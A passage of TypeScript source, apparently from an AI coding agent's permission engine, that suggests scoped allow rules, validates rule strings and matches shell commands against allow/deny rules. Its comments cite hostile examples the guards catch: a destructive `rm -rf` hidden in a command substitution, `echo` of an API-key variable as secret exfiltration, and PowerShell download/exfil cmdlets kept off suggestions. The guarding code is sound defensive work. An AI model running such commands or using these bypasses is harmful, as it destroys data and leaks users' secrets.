    if (override !== undefined) depth = override;
  }
  const parts = [cmd];
  // Collect subcommand-shaped words up to the spec depth; stop at the first flag
  // or non-subcommand-shaped token once collection has begun.
  while (parts.length < depth && i < tokens.length) {
    const tok = tokens[i]!;
    if (tok.startsWith('-') || !SUBCOMMAND_SHAPE_RE.test(tok)) break;
    parts.push(tok);
    i++;
  }
  if (parts.length < 2) return null;
  return parts.join(' ');
}

/**
 * First-word fallback prefix (e.g. `npm`, `cargo`). Skips safe env vars, rejects
 * paths/flags/numbers/filenames and anything in BARE_SHELL_PREFIXES. Mirrors
 * the reference's getFirstWordPrefix.
 */
export function getFirstWordPrefix(command: string): string | null {
  const tokens = command.trim().split(/\s+/).filter(Boolean);
  let i = 0;
  while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
    if (!SAFE_ENV_VARS.has(tokens[i]!.split('=')[0]!)) return null;
    i++;
  }
  const cmd = tokens[i];
  if (!cmd) return null;
  if (!SUBCOMMAND_SHAPE_RE.test(cmd)) return null;
  if (isBareShellPrefix(cmd)) return null;
  // Dangerous PowerShell cmdlets/aliases (download/exfil, code-exec, process
  // spawn, scriptblock-arg gate, …): a `invoke-webrequest*` / `foreach-object*`
  // wildcard would defeat the per-command security checks, so never suggest one.
  if (isPowerShellNeverSuggest(cmd)) return null;
  return cmd;
}

export function suggestAllowPrefix(command: string): string | null {
  const cleaned = stripOutputRedirections(command);
  // A simple `--help` command is read-only and safe: offer the FULL command as
  // the allow rule rather than a broad `cmd:*` prefix that would grant arbitrary
  // execution through the same interpreter. Mirrors the reference's isHelpCommand
  // bypass of prefix extraction (utils/bash/commands.ts).
  if (isHelpCommand(cleaned)) return cleaned.trim();
  // Wrapper-aware derivation: for a wrapped command (`nice -n5 git log`,
  // `sudo apt-get install foo`, `timeout 5 npm test`) the wrapper root is itself a
  // BARE_SHELL_PREFIX (`sudo`/`env`/`nice`/…) so the normal path below would refuse
  // to suggest anything. Instead derive the INNER command's prefix and re-compose
  // it with the (bounded, fail-closed) wrapper chain so the grant stays narrowly
  // scoped to the wrapped form. Mirrors the reference's handleWrapper composed prefix.
  const wrapped = unwrapWrapperChain(cleaned);
  if (wrapped) {
    const innerPrefix = suggestAllowPrefix(wrapped.inner);
    return innerPrefix ? [...wrapped.wrappers, innerPrefix].join(' ') : null;
  }
  const two = getSimpleCommandPrefix(cleaned);
  // Guard the two-word path too: `start-process notepad*` would match
  // `start-process notepad.exe & evil`, so a dangerous PowerShell spawner as
  // the ROOT word is never offered even with a scoped subcommand. Likewise a
  // shell/interpreter root (`bash foo`, `powershell.exe x`, `pwsh something`)
  // must never anchor a scoped prefix — it would auto-allow arbitrary execution
  // through the shell (the reference's DANGEROUS_SHELL_PREFIXES applied to extraction).
  if (two) {
    const root = two.split(' ')[0]!;
    // A scoped interpreter MODULE-exec form (`python -m http.server`) runs one
    // named module, not arbitrary code — a narrow, safe grant to offer even though
    // the interpreter root is itself a bare-shell prefix. Let it through the guard.
    if (isScopedModulePrefix(two)) return two;
    return isBareShellPrefix(root) || isPowerShellNeverSuggest(root) ? null : two;
  }
  const one = getFirstWordPrefix(cleaned);
  if (one && !SUBCOMMAND_AWARE_ROOTS.has(one)) return one;
  return null;
}

export function getCompoundCommandPrefixes(
  command: string,
  excludeSubcommand?: (subcommand: string) => boolean,
): string[] {
  const subcommands = splitCompoundCommand(command);
  if (subcommands.length <= 1) {
    const only = suggestAllowPrefix(command.trim());
    return only ? [only] : [];
  }
  const prefixes: string[] = [];
  for (const sub of subcommands) {
    const trimmed = sub.trim();
    if (!trimmed) continue;
    if (excludeSubcommand?.(trimmed)) continue;
    const prefix = suggestAllowPrefix(trimmed);
    if (prefix) prefixes.push(prefix);
  }
  if (prefixes.length === 0) return [];
  // Group by root word + collapse each group via case-insensitive word-aligned
  // LCP, dropping any group whose LCP degenerates to a bare subcommand-aware root
  // (`git fetch`+`git worktree add` → `git`, which would auto-allow `git push
  // --force` forever). This collapse is the single canonical compound-prefix
  // collapser in {@link collapseCompoundPrefixes} (tools/command-prefix.ts); the
  // grouping is CASE-INSENSITIVE so a PowerShell mixed-case chain (`Git add`+`git
  // commit`) still collapses to the one `git` group. Mirrors the reference's
  // getCompoundCommandPrefixesStatic (staticPrefix.ts L246-284).
  return collapseCompoundPrefixes(prefixes, root => SUBCOMMAND_AWARE_ROOTS.has(root));
}

/**
 * Legacy / cross-framework tool-name aliases → AMI canonical tool names. A
 * permission rule written with a reference capitalized name (`Bash`, `Edit`)
 * or an AMI legacy name resolves to the same canonical AMI tool, so rules keep
 * matching after a rename or when imported from a reference settings file.
 *
 * Both the CURRENT the reference agent-tool name ({@link AGENT_TOOL_NAME} = `Agent`) and
 * its LEGACY spelling ({@link LEGACY_AGENT_TOOL_NAME} = `Task`) map to AMI's `task`
 * tool, so a rule like `Agent(researcher)` imported from a reference settings file
 * gates AMI's subagent spawns exactly as `task(researcher)` does.
 */
export const PERMISSION_TOOL_ALIASES: Record<string, string> = {
  Bash: 'bash', Read: 'file_read', Edit: 'file_edit', Write: 'file_edit',
  MultiEdit: 'file_edit', Glob: 'glob', Grep: 'grep', LS: 'list_dir',
  WebFetch: 'web_fetch', WebSearch: 'web_search', NotebookEdit: 'notebook_edit',
  [AGENT_TOOL_NAME]: 'task', [LEGACY_AGENT_TOOL_NAME]: 'task', TodoWrite: 'todo_write', Skill: 'skill',
  // AMI legacy aliases
  KillShell: 'task_stop', BashOutputTool: 'task_output', AgentOutputTool: 'task_output',
};

/** Canonicalize a tool name used in a permission rule (legacy/alias → current). */
export function normalizeToolName(name: string): string {
  return PERMISSION_TOOL_ALIASES[name] ?? name;
}

/**
 * Reverse of {@link normalizeToolName}: given a CANONICAL AMI tool name, return
 * every legacy / cross-framework alias that maps to it (the keys of
 * {@link PERMISSION_TOOL_ALIASES} whose value is `canonicalName`), sorted for
 * stable display. This is the inverse boundary the reference exposes as
 * `getLegacyToolNames` (utils/permissions/permissionRuleParser.ts L35-41): a rule
 * written against the current name can be expanded to the historical/aliased
 * spellings, and an introspection / diagnostic surface can tell the user "tool X
 * also matches legacy names […]" when displaying a permission rule. Matching
 * already works both ways (both sides go through {@link normalizeToolName}); this
 * is purely for enumeration/display. Returns `[]` for a tool with no aliases.
 */
export function getLegacyToolNames(canonicalName: string): string[] {
  const result: string[] = [];
  for (const [alias, canonical] of Object.entries(PERMISSION_TOOL_ALIASES)) {
    if (canonical === canonicalName && alias !== canonicalName) result.push(alias);
  }
  return result.sort();
}

/** The pattern class of a tool's permission-rule content, or `undefined` for a
 *  tool that uses a custom content validator (not file-glob / bash-wildcard). */
export function toolPatternClass(toolName: string): ToolPatternClass | undefined {
  return TOOL_PATTERN_CLASS[normalizeToolName(toolName)];
}

/** True when a tool's permission patterns are filesystem GLOBS (`*.ts`,
 *  `src/**`) — `:*` is Bash-only syntax here and mid-path wildcards are suspect. */
export function isFilePatternTool(toolName: string): boolean {
  return toolPatternClass(toolName) === 'file';
}

/** True when a tool's permission patterns are bash command prefixes/wildcards
 *  (free `*` plus the legacy `command:*` prefix form). */
export function isBashPrefixTool(toolName: string): boolean {
  return toolPatternClass(toolName) === 'bash';
}

/**
 * Parse a canonical permission-rule string into `{ toolName, ruleContent? }`,
 * honouring escaped parentheses and canonicalizing the tool name. `Tool()` and
 * `Tool(*)` collapse to a tool-wide rule (no ruleContent). Mirrors the reference's
 * permissionRuleValueFromString.
 */
export function permissionRuleValueFromString(ruleString: string): PermissionRuleValue {
  const openParenIndex = findFirstUnescapedChar(ruleString, '(');
  if (openParenIndex === -1) return { toolName: normalizeToolName(ruleString) };
  const closeParenIndex = findLastUnescapedChar(ruleString, ')');
  if (closeParenIndex === -1 || closeParenIndex <= openParenIndex) {
    return { toolName: normalizeToolName(ruleString) };
  }
  if (closeParenIndex !== ruleString.length - 1) {
    return { toolName: normalizeToolName(ruleString) };
  }
  const toolName = ruleString.substring(0, openParenIndex);
  const rawContent = ruleString.substring(openParenIndex + 1, closeParenIndex);
  if (!toolName) return { toolName: normalizeToolName(ruleString) };
  if (rawContent === '' || rawContent === '*') return { toolName: normalizeToolName(toolName) };
  return { toolName: normalizeToolName(toolName), ruleContent: unescapeRuleContent(rawContent) };
}

/** Read-shaped canonical tools: they access content without mutating the tree. */
const READ_SHAPED_FILE_TOOLS = new Set(['file_read', 'glob', 'grep', 'list_dir']);

/**
 * Canonical tools whose deny/allow rule pattern is matched against a FILESYSTEM
 * PATH (not a command string or a free-text pattern like grep's). On a
 * case-insensitive filesystem these are matched case-insensitively so a deny rule
 * written in one casing still blocks the same file reached via another casing
 * (`{@link pathRuleCaseInsensitive}`). `grep` is deliberately excluded — its rule
 * content is a search pattern where case is significant.
 */
const FILE_PATH_RULE_TOOLS = new Set([
  'file_read', 'file_edit', 'file_write', 'notebook_edit', 'notebook_read', 'glob', 'list_dir',
]);

/**
 * Classify a tool call's filesystem operation type (parity with the reference's
 * `operationType`), or `undefined` for a tool that targets no file path. Read-shaped
 * tools are `'read'`; a mutating file tool is `'create'` when its target does not yet
 * exist on disk and `'write'` when it does — so a prompt can distinguish editing
 * existing content from bringing a new file into being. The on-disk probe is a
 * best-effort `existsSync`; an erroring path falls back to `'write'`.
 */
export function resolveFileOperationType(
  toolName: string,
  input: Record<string, unknown>,
): FileOperationType | undefined {
  const canonical = normalizeToolName(toolName);
  if (READ_SHAPED_FILE_TOOLS.has(canonical)) return 'read';
  const filePath = (input.file_path ?? input.path) as unknown;
  if (typeof filePath !== 'string' || filePath.length === 0) return undefined;
  try {
    return fs.existsSync(expandPath(filePath)) ? 'write' : 'create';
  } catch {
    return 'write';
  }
}

/**
 * Compute the pre-baked {@link PermissionUpdate} *suggestions* to attach to an
 * ask/deny permission decision — the "always allow X" candidates a prompt can
 * offer for one-click acceptance (the reference's `permissionResult.suggestions`, parsed
 * by `extractRules`/`extractDirectories`). For a bash call it derives a scoped
 * allow rule per (mutating) subcommand via {@link getCompoundCommandPrefixes}
 * (sharing the single canonical prefix helper — no duplicate heuristic); for a
 * read-shaped file tool it suggests widening the read boundary to the file's
 * directory; for a mutating file tool it suggests an allow rule for that path.
 * Returns `[]` when nothing safe can be suggested (the caller then offers only
 * the plain one-off allow). All suggestions default to the ephemeral `session`
 * destination — persistence is a separate, explicit choice.
 */
/**
 * Derive the DOMAIN a `web_fetch` call targets, for a domain-scoped "always
 * allow" rule — the URL's lowercased hostname, or `null` when the input carries
 * no usable URL. Parity with the reference's WebFetch `inputToPermissionRuleContent`
 * (which yields `domain:<hostname>`); AMI's canonical web_fetch rule content is
 * the BARE hostname (`web_fetch(example.com)`) so it matches AMI's existing
 * web_fetch matcher and sandbox-domain extraction — an intentional superset
 * divergence kept consistent with {@link validatePermissionRule}.
 */
export function deriveWebFetchDomainRuleContent(input: Record<string, unknown>): string | null {
  const url = input.url;
  if (typeof url !== 'string' || url.length === 0) return null;
  try {
    const hostname = new URL(url).hostname;
    return hostname ? hostname.toLowerCase() : null;
  } catch {
    return null;
  }
}

export function buildPermissionSuggestions(
  toolName: string,
  input: Record<string, unknown>,
): PermissionUpdate[] {
  const canonical = normalizeToolName(toolName);
  if (canonical === 'bash') {
    const command = typeof input.command === 'string' ? input.command : undefined;
    if (!command) return [];
    const rules: PermissionRuleValue[] = getCompoundCommandPrefixes(command)
      // Cap the per-subcommand rule dump so a wide compound command does not
      // produce an unreadable 10+ rule prompt (the reference's MAX_SUGGESTED_RULES_FOR_COMPOUND).
      .slice(0, MAX_SUGGESTED_RULES_FOR_COMPOUND)
      .map(prefix => ({ toolName: 'bash', ruleContent: `${prefix}*` }));
    return rules.length > 0
      ? [{ type: 'addRules', behavior: 'allow', destination: 'session', rules }]
      : [];
  }
  if (canonical === 'web_fetch') {
    // Domain-scoped "always allow" candidate: grant exactly the URL's host, not a
    // tool-wide web_fetch allow (least privilege). Parity with the reference's
    // "Yes, and don't ask again for <hostname>" option.
    const domain = deriveWebFetchDomainRuleContent(input);
    return domain
      ? [{ type: 'addRules', behavior: 'allow', destination: 'session', rules: [{ toolName: 'web_fetch', ruleContent: domain }] }]
      : [];
  }
  const filePath = (input.file_path ?? input.path) as unknown;
  if (typeof filePath === 'string' && filePath.length > 0) {
    // Operation-aware shaping (parity with the reference's operationType): a READ widens
    // the read boundary by directory; a mutating op offers a path allow rule.
    if (resolveFileOperationType(canonical, input) === 'read') {
      const dir = path.dirname(filePath);
      // Offer BOTH a runtime read-root widening (addDirectories) AND a persistable,
      // path-scoped `file_read` allow rule (createReadRuleSuggestion), so granting a
      // read can either just widen this session or be saved as a normal rule. The
      // Read rule is omitted when the directory is the un-scopable filesystem root.
      const suggestions: PermissionUpdate[] = [
        { type: 'addDirectories', destination: 'session', directories: [dir] },
      ];
      const readRule = createReadRuleSuggestion(dir);
      if (readRule) suggestions.push(readRule);
      return suggestions;
    }
    const suggestions: PermissionUpdate[] = [];
    // A write under `<configRoot>/skills/<name>/` offers a NARROW, least-privilege
    // "allow edits to this skill only" session grant FIRST — scoped to just that one
    // skill dir — so iterating on a skill does not require the blanket config-folder
    // grant below (which would also expose settings.json, hooks/, and other skills).
    // Mirrors the reference's getClaudeSkillScope skill-scoped addRules suggestion.
    const skillScope = getSkillScopeRule(filePath, process.cwd());
    if (skillScope) {
      suggestions.push({
        type: 'addRules', behavior: 'allow', destination: 'session',
        rules: [{ toolName: canonical, ruleContent: skillScope.ruleContent }],
      });
    }
    // A write/create inside the agent's OWN config folder also offers a broader,
    // SESSION-scoped grant for that whole config folder — the reference's config-folder
    // "allow editing its own settings for this session" option — so the user is
    // not re-prompted per settings file. Session-only (never persisted): it widens
    // self-modification rights, which must not survive the process.
    const configFolder = matchConfigFolderRoot(filePath, process.cwd());
    if (configFolder) {
      suggestions.push({
        type: 'addRules', behavior: 'allow', destination: 'session',
        rules: [{ toolName: canonical, ruleContent: `${configFolder.root}${path.sep}*` }],
      });
    }
    suggestions.push({
      type: 'addRules', behavior: 'allow', destination: 'session',
      rules: [{ toolName: canonical, ruleContent: filePath }],
    });
    // A one-tap "switch to acceptEdits" affordance for an edit-capable tool, so the
    // user can unblock ALL future edits for the session rather than granting one
    // path rule at a time (parity: the reference's blocked-write `{ type:'setMode',
    // mode:'acceptEdits' }` suggestion, pathValidation.ts L1792-1798). Offered only
    // for the tools acceptEdits actually auto-allows ({@link ACCEPT_EDITS_EDIT_TOOLS})
    // — it is a no-op for a read or a bash command, which have their own affordances.
    if (ACCEPT_EDITS_EDIT_TOOLS.has(canonical)) {
      suggestions.push({ type: 'setMode', mode: 'acceptEdits', destination: 'session' });
    }
    return suggestions;
  }
  return [];
}

/**
 * The pluggable per-tool content validator for `toolName`, or `undefined` when the
 * tool uses only the generic bash/file-glob pattern checks. The name is
 * canonicalized first, so a reference-spelled `WebFetch`/`WebSearch` resolves to the
 * same validator as `web_fetch`/`web_search`. Parity with the reference's
 * `getCustomValidation` (utils/settings/permissionValidation.ts L137-143).
 */
export function getCustomValidation(toolName: string): ToolContentValidator | undefined {
  return TOOL_CONTENT_VALIDATORS[normalizeToolName(toolName)];
}

/**
 * Validate a user-supplied permission-rule string, returning an actionable
 * diagnostic. Catches empty rules, mismatched / empty parentheses, empty tool
 * names, and bash/file pattern mistakes (`:*` placement, `:*` in file patterns).
 * Mirrors the reference's validatePermissionRule, minus the reference-specific
 * uppercase-first convention (AMI canonical tool names are lowercase); the
 * per-tool content checks run through the pluggable {@link getCustomValidation}
 * registry (parity with the reference's customValidation hook).
 */
export function validatePermissionRule(rule: string): {
  valid: boolean; error?: string; suggestion?: string; examples?: string[];
} {
  if (!rule || rule.trim() === '') {
    return { valid: false, error: 'Permission rule cannot be empty' };
  }
  let openCount = 0, closeCount = 0;
  for (let i = 0; i < rule.length; i++) {
    if (rule[i] === '(' && !isEscapedAt(rule, i)) openCount++;
    if (rule[i] === ')' && !isEscapedAt(rule, i)) closeCount++;
  }
  if (openCount !== closeCount) {
    return {
      valid: false, error: 'Mismatched parentheses',
      suggestion: 'Ensure all opening parentheses have matching closing parentheses',
    };
  }
  // Empty parentheses (escape-aware).
  for (let i = 0; i < rule.length - 1; i++) {
    if (rule[i] === '(' && rule[i + 1] === ')' && !isEscapedAt(rule, i)) {
      const toolName = rule.substring(0, rule.indexOf('('));
      if (!toolName) {
        return {
          valid: false, error: 'Empty parentheses with no tool name',
          suggestion: 'Specify a tool name before the parentheses',
        };
      }
      return {
        valid: false, error: 'Empty parentheses',
        suggestion: `Either specify a pattern or use just "${toolName}" without parentheses`,
        examples: [`${toolName}`, `${toolName}(some-pattern)`],
      };
    }
  }
  const parsed = permissionRuleValueFromString(rule);
  // Empty / whitespace-only rules are rejected above; every remaining input yields a
  // non-empty `toolName` via `normalizeToolName` (including the `(`…`)` fallback path),
  // so a second "empty tool name" check was unreachable duplicate validation.
  // MCP-rule validation (before the generic tool checks). An MCP rule scopes a
  // whole server (`mcp__server`), all its tools (`mcp__server__*`), or one tool
  // (`mcp__server__tool`) — it never carries a parenthesized pattern. Check BOTH
  // the parsed ruleContent AND the raw '(' count, because the parser normalizes a
  // standalone wildcard (`mcp__server(*)`) to a pattern-less name. Mirrors
  // the reference's permissionValidation MCP branch.
  const mcpInfo = mcpInfoFromString(parsed.toolName);
  if (mcpInfo) {
    if (parsed.ruleContent !== undefined || countUnescapedChar(rule, '(') > 0) {
      return {
        valid: false,
        error: 'MCP rules do not support patterns in parentheses',
        suggestion: `Use "${parsed.toolName}" without parentheses, or use "mcp__${mcpInfo.serverName}__*" for all tools`,
        examples: [
          `mcp__${mcpInfo.serverName}`,
          `mcp__${mcpInfo.serverName}__*`,
          mcpInfo.toolName && mcpInfo.toolName !== '*'
            ? `mcp__${mcpInfo.serverName}__${mcpInfo.toolName}`
            : undefined,
        ].filter(Boolean) as string[],
      };
    }
    return { valid: true };
  }
  // Bash prefix-rule mistakes: `:*` must be at the end and non-empty.
  if (isBashPrefixTool(parsed.toolName) && parsed.ruleContent !== undefined) {
    const content = parsed.ruleContent;
    if (content === ':*') {
      return {
        valid: false, error: 'Prefix cannot be empty before :*',
        suggestion: 'Specify a command prefix before :*',
        examples: ['bash(npm:*)', 'bash(git:*)'],
      };
    }
    if (content.includes(':*') && !content.endsWith(':*')) {
      return {
        valid: false, error: 'The :* pattern must be at the end',
        suggestion: 'Move :* to the end for prefix matching, or use * for wildcard matching',
        examples: ['bash(npm run:*) - prefix matching', 'bash(npm run *) - wildcard matching'],
      };
    }
  }
  // File-pattern-tool mistakes (file_read / file_edit / glob / notebook_edit):
  // their rule content is a filesystem GLOB, so the bash-only `:*` prefix form is
  // invalid, and a wildcard that is not at a path boundary usually signals a
  // confused pattern. Mirrors the reference's permissionValidation file-tool branch
  // (utils/settings/permissionValidation.ts L199-236).
  if (isFilePatternTool(parsed.toolName) && parsed.ruleContent !== undefined) {
    const content = parsed.ruleContent;
    // `:*` is Bash prefix syntax — point the user at glob patterns instead.
    if (content.includes(':*')) {
      return {
        valid: false, error: 'The ":*" syntax is only for Bash prefix rules',
        suggestion: 'Use glob patterns like "*" or "**" for file matching',
        examples: [
          `${parsed.toolName}(*.ts) - matches .ts files`,
          `${parsed.toolName}(src/**) - matches all files in src`,
          `${parsed.toolName}(**/*.test.ts) - matches test files`,
        ],
      };
    }
    // A `*` that is not at a path boundary (start, end, `**`, `/*`, `*.`, `*)`)
    // is usually a mistake. `**` anywhere is always accepted (recursive glob).
    if (
      content.includes('*') &&
      !/^\*|\*$|\*\*|\/\*|\*\.|\*\)/.test(content) &&
      !content.includes('**')
    ) {
      return {
        valid: false, error: 'Wildcard placement might be incorrect',
        suggestion: 'Wildcards are typically used at path boundaries',
        examples: [
          `${parsed.toolName}(*.js) - all .js files`,
          `${parsed.toolName}(src/*) - all files directly in src`,
          `${parsed.toolName}(src/**) - all files recursively in src`,
        ],
      };
    }
  }
  // Per-tool content validation via the pluggable {@link TOOL_CONTENT_VALIDATORS}
  // registry (the reference's toolValidationConfig customValidation hook). Consulted for
  // any tool with a registered validator (WebFetch domains, WebSearch terms, …).
  if (parsed.ruleContent !== undefined) {
    const customValidation = getCustomValidation(parsed.toolName);
    if (customValidation) {
      const customResult = customValidation(parsed.ruleContent);
      if (!customResult.valid) return customResult;
    }
  }
  return { valid: true };
}

/**
 * Fault-tolerant filter over a raw array of permission-rule STRINGS (the
 * `permissions.{allow,deny,ask}` settings.json form). Drops every entry that is
 * not a string or that fails {@link validatePermissionRule}, keeping the rest so
 * one malformed rule cannot poison the whole settings file, and returns a
 * human-readable warning per dropped rule. Fail-open-safe: on any unexpected
 * shape the entry is skipped with a warning rather than throwing. Mirrors
 * the reference's filterInvalidPermissionRules (settings/validation.ts) wording.
 */
export function filterInvalidPermissionRules(
  rules: unknown,
  key = 'permissions',
): { kept: string[]; warnings: string[] } {
  const kept: string[] = [];
  const warnings: string[] = [];
  if (!Array.isArray(rules)) return { kept, warnings };
  for (const entry of rules) {
    if (typeof entry !== 'string') {
      warnings.push(`Non-string value in ${key} array was removed`);
      continue;
    }
    const result = validatePermissionRule(entry);
    if (result.valid) {
      kept.push(entry);
      continue;
    }
    warnings.push(`Invalid permission rule "${entry}" was skipped: ${formatPermissionRuleError(result)}`);
  }
  return { kept, warnings };
}

function matchBashSub(pattern: string, sub: string, ruleAction: 'allow' | 'deny' | 'ask'): boolean {
  // Allow rules strip only SAFE_ENV_VARS (an unsafe env prefix must break the
  // match → prompt); deny/ask rules strip ALL env vars so no prefix can hide a
  // denied command.
  const strippedRaw = stripEnvVarPrefix(sub, /* safeEnvOnly */ ruleAction === 'allow');
  // the reference `cmd:*` prefix convention (validated + stored but previously unmatched):
  // a `prefix:*` rule grants/denies the command prefix plus any arguments. Checked
  // ahead of the glob match because `:` is otherwise a literal glob character.
  const rulePrefix = permissionRuleExtractPrefix(pattern);
  if (rulePrefix !== null && commandHasRulePrefix(strippedRaw, rulePrefix)) return true;
  if (matchPattern(pattern, strippedRaw)) return true;
  // Env-prefix-scoped rule parity: the reference deliberately KEEPS leading `VAR=...`
  // assignments in the matchable command prefix (`GOEXPERIMENT=synctest go test`,
  // `PYTHONPATH=/tmp python3`) so an allow/deny rule can be scoped to a command
  // TOGETHER WITH its specific env prefix (utils/bash/commands.ts L478-484). AMI
  // otherwise strips env vars before matching, which makes a rule that names a
  // SAFE_ENV_VARS prefix (e.g. `Bash(GOEXPERIMENT=synctest go test:*)`) unmatchable
  // — `GOEXPERIMENT` is stripped from the command, so the prefix never lines up.
  // When the RULE pattern ITSELF carries a leading env-var assignment, also match it
  // against the command's RAW (unstripped) form. Additive + safe: only a rule that
  // literally names the env prefix benefits — a bare `go test:*` rule still sees only
  // the stripped command (the raw `GOEXPERIMENT=… go test` would NOT satisfy a bare
  // `go test` prefix), so this never broadens an un-scoped allow.
  if (ENV_VAR_ASSIGN_RE.test(pattern.trimStart())) {
    const rawSub = sub.trim();
    if (rulePrefix !== null && commandHasRulePrefix(rawSub, rulePrefix)) return true;
    if (matchPattern(pattern, rawSub)) return true;
  }
  // PowerShell cross-alias rule matching (Windows only — AMI's bash tool runs
  // PowerShell on Windows): a rule written for one spelling of a cmdlet also
  // matches the command's OTHER spellings of the same canonical cmdlet, so a
  // deny on `Remove-Item` blocks `rm`/`del`/`ri` and a rule on `rm` blocks
  // `Remove-Item`. Deny/ask strip a module prefix (fail-safe over-match); allow
  // keeps it (allow must never over-match a differently-scoped cmdlet). The
  // compare is case-insensitive, mirroring Windows + the reference's PowerShell
  // filterRulesByContentsMatchingInput. Gated off POSIX so a Linux `rm`/`echo`
  // is never canonicalized into a PowerShell cmdlet (which would fail OPEN on an
  // allow rule or wrongly fire a PowerShell-named deny).
  if (process.platform === 'win32') {
    const canonCmd = canonicalizePowerShellCommandName(strippedRaw, /* stripModule */ true);
    const canonPat = canonicalizePowerShellCommandName(pattern, /* stripModule */ ruleAction !== 'allow');
    if ((canonCmd !== strippedRaw || canonPat !== pattern) &&
        matchPattern(canonPat, canonCmd, /* caseInsensitive */ true)) {
      return true;
    }
  }
  if (ruleAction === 'allow') return false;
  // Strip env prefix FIRST (handles quoted values like FOO="a b"), THEN collapse
  // obfuscation and drop quote/backtick characters from the remaining command.
  const deob = deobfuscateEnvExpansion(strippedRaw).replace(/["'`]/g, '');
  if (deob === strippedRaw) return false;
  // A deny/ask `prefix:*` rule must also catch the de-obfuscated form so a denied
  // prefix cannot be hidden behind quote/expansion obfuscation.
  if (rulePrefix !== null && commandHasRulePrefix(deob, rulePrefix)) return true;
  return matchPattern(pattern, deob);
}

export function matchBashPattern(pattern: string, command: string, ruleAction: 'allow' | 'deny' | 'ask'): boolean {
  // Heredoc bodies are stripped BEFORE line-continuation joining (see
  // {@link normalizeCommandForMatching}) so a continuation inside a heredoc body
  // can never shift the closing delimiter and hide a real post-heredoc statement
  // from the sub-command matcher — the ordering guarantee an `allow` rule relies on.
  const normalized = normalizeCommandForMatching(command);
  const subCommands = splitCompoundCommand(normalized);

  // Fail-closed on compound-command fanout above the cap: an allow rule must NOT
  // auto-approve a pathologically wide chain (it falls through to a prompt).
  // Deny/ask matching deliberately keeps scanning so a denied command cannot be
  // hidden by padding a chain past the cap (CC-643).
  if (ruleAction === 'allow' && subCommands.length > MAX_SUBCOMMANDS_FOR_SECURITY_CHECK) {
    return false;
  }

  let baseMatch: boolean;
  if (subCommands.length <= 1) {
    // Use the single sub-command (which has been unwrapped from control
    // structures) rather than the original normalized string, so that
    // e.g. "for f in *.ts; do cat $f; done" matches a "cat *" rule.
    const effective = subCommands.length === 1 ? subCommands[0] : normalized;
    baseMatch = matchBashSub(pattern, effective, ruleAction);
  } else if (ruleAction === 'allow') {
    baseMatch = subCommands.every(sub => matchBashSub(pattern, sub, 'allow'));
  } else {
    // deny / ask: any sub-command match triggers
    baseMatch = subCommands.some(sub => matchBashSub(pattern, sub, ruleAction));
  }
  if (baseMatch) return true;

  // M1: deny/ask rules ALSO decompose `$(...)` / backtick command substitutions
  // (recursively) and match each extracted inner command, so a denied command
  // cannot hide inside a substitution (e.g. `echo $(rm -rf x)`). Allow matching
  // stays STRICT above — decomposition can only ADD denies, never broaden allows.
  if (ruleAction === 'allow') return false;
  for (const inner of extractCommandSubstitutions(normalized)) {
    for (const sub of splitCompoundCommand(inner)) {
      if (matchBashSub(pattern, sub, ruleAction)) return true;
    }
  }
  return false;
}

/** True when a single argument token carries a VARIABLE expansion whose value
 *  an allow rule never vetted: a reference `$NAME` / `${NAME}` / `$env:NAME`
 *  whose name is not a vetted {@link SAFE_ENV_VARS} entry. Arithmetic `$((…))`
 *  and special/positional params (`$1`, `$@`, `$?`, `$$`) are not value leaks.
 *  Command substitutions (`$(…)` / backtick) are intentionally NOT handled here
 *  — AMI already decomposes substitutions in the deny/ask matcher (and elevates
 *  a destructive inner to a prompt), so folding them in would both regress the
 *  "benign `$(date)` stays allowed" behavior and duplicate that path. */
function argTokenLeaksValue(token: string, vetted?: ReadonlySet<string>): boolean {
  // Named variable expansion: `$NAME`, `${NAME}`, or PowerShell-style `$env:NAME`.
  const re = /\$\{?(?:env:)?([A-Za-z_][A-Za-z0-9_]*)/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(token)) !== null) {
    const name = m[1]!;
    // A vetted SAFE_ENV_VARS name OR a loop variable bound to a non-leaking
    // word-list (see {@link collectSafeLoopVars}) is not a value leak.
    if (!SAFE_ENV_VARS.has(name) && !(vetted && vetted.has(name))) return true;
  }
  return false;
}

/**
 * Variable names bound by a `for NAME in LIST` whose word-LIST introduces no
 * unvetted value expansion (a glob/literal list such as `*.ts` or `a b c`). Such
 * a loop variable's runtime values come from that already-vetted list — NOT from
 * an unvetted env/secret — so expanding it in a loop-body argument is not a value
 * leak and must not withhold allow-rule auto-approval (the for-loop-with-glob
 * perk: `for f in *.ts; do cat "$f"; done` stays auto-safe, matching the
 * {@link containsShellSubstitution} tolerance of a quoted loop-body `"$f"`).
 *
 * SECURITY: a list that itself leaks (`for f in $SECRET; do echo "$f"; done`)
 * does NOT vet its variable — `$f` would then iterate the secret's words — so the
 * body's `"$f"` still forces an explicit prompt. Bindings are collected in source
 * order so a later loop's list can safely reference an earlier vetted loop var.
 */
function collectSafeLoopVars(command: string): Set<string> {
  const vetted = new Set<string>();
  // `for NAME in LIST` — LIST runs to the next `;`/newline (where `do` follows).
  const forRe = /\bfor\s+([A-Za-z_][A-Za-z0-9_]*)\s+in\s+([^\n;]*)/g;
  let m: RegExpExecArray | null;
  while ((m = forRe.exec(command)) !== null) {
    const name = m[1]!;
    const listTokens = stripSingleQuotedSpans(m[2]!).trim().split(/\s+/).filter(Boolean);
    if (!listTokens.some(t => argTokenLeaksValue(t, vetted))) vetted.add(name);
  }
  return vetted;
}

/**
 * True when ANY argument of ANY sub-command expands a non-vetted variable — i.e.
 * a user `allow` rule on the command would NOT cover what the expansion actually
 * injects. A user who writes `Bash(echo:*)` asserts that running `echo` is safe,
 * not that `echo $ANTHROPIC_API_KEY` (secret exfiltration) or
 * `echo $env:ANTHROPIC_API_KEY` is safe. The permission engine uses this to
 * withhold allow-rule auto-approval for such a command and force an explicit
 * prompt.
 *
 * Mirrors the reference's `argLeaksValue` (PowerShell `readOnlyValidation.ts`),
 * ported to bash variable-expansion syntax: command-word position is exempt (it
 * is what the allow rule names); only ARGUMENTS are inspected. A reference to a
 * vetted {@link SAFE_ENV_VARS} name (`$NODE_ENV`, `$LANG`) is NOT a leak — those
 * are the same names stripped from an allow-rule env prefix, so the two paths
 * agree on what counts as a safe environment passthrough. Command substitutions
 * are handled separately by the deny/ask substitution-decomposition path.
 */
export function bashCommandArgLeaksValue(command: string): boolean {
  // Same heredoc-before-join ordering as {@link matchBashPattern} so a `$SECRET`
  // reference buried past a heredoc body (or a continuation inside one) is split
